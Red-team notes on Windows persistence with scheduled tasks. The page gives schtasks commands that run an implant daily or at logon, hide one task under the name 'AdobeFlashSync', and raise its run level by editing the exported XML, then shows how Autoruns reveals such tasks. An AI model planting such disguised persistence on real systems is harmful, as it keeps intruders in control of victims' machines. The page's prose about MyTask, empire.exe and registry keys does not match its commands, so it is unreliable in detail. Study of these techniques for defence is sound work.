# Scheduled Tasks

#### Scheduled tasks have been abused by ransomware for a long time and is another commonly used and simple persistence technique. Adversaries can create scheduled tasks that run at a specific time and day and execute arbitrary payloads.

run the following command to generate a new task called MyTask that is scheduled to run daily at 9:00am that will execute the empire.exe binary located in the C:\ root folder.

#### <mark style="color:orange;">here is the official Microsoft documentation for</mark> <mark style="color:orange;"></mark><mark style="color:orange;">`schtask`</mark> <mark style="color:orange;"></mark><mark style="color:orange;">with various example commands:</mark>

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create#to-schedule-a-task-to-run-every-n-hours" %}

#### <mark style="color:green;">as a regular USER:</mark>

```tsconfig
schtasks /create /tn "Mytasks\go" /sc daily /st 09:00 /tr "c:\rto\pers\implant\implant.exe"
schtasks /create /tn "Some task name" /tr "app.exe" /sc HOURLY
schtasks /query /tn "mytasks\go" /fo:list /v
schtasks /run /tn "mytasks\go"
```

#### <mark style="color:green;">as a LOCAL ADMIN:</mark>

```tsconfig
schtasks /create /sc onlogon /tn AdobeFlashSync /tr "c:\rto\pers\implant\implant.exe"
schtasks /query /tn "AdobeFlashSync" /fo list

# take the configurations from an xml file

# export the task config 
schtasks /query /tn AdobeFlashSync /xml > c:\RTO\PERS\tsk.xml

#under <principal> section add this tag:
<RunLevel>HighestAvailable</RunLevel>
 
# then remove the task and make a new one with the modified configuration
schtasks /delete /f /tn AdobeFlashSync
schtasks /create /tn AdobeFlashSync /xml c:\RTO\PERS\tsk.xml

# now the privilege level is local admin
```

## <mark style="color:red;">Multi-action Tasks</mark>

By modifying the task configuration file, we can add additional actions to the scheduled task under `<Actions>` section.

for example we can execute a binary file by adding :

```xml
<Exec>
    <Command>c:\users\rto\desktop\implant.exe</Command>
</Exec>
```

## <mark style="color:red;">Detection</mark>

Microsoft has a Windows internals utility called Autoruns that shows you what programs are configured to run during system bootup or login. On the victim machine run the Autoruns64.exe as administrator.

Going to the Logon tab we can see the Run registry key that was added pointing to the empire.exe binary as well as the empire.exe binary that was dropped to the Startup folder.

![](<../../../.gitbook/assets/image (157).png>)

Under the Scheduled Task tab I can see the MyTask that points to the empire.exe saved in the root C:\\

![](<../../../.gitbook/assets/image (144).png>)
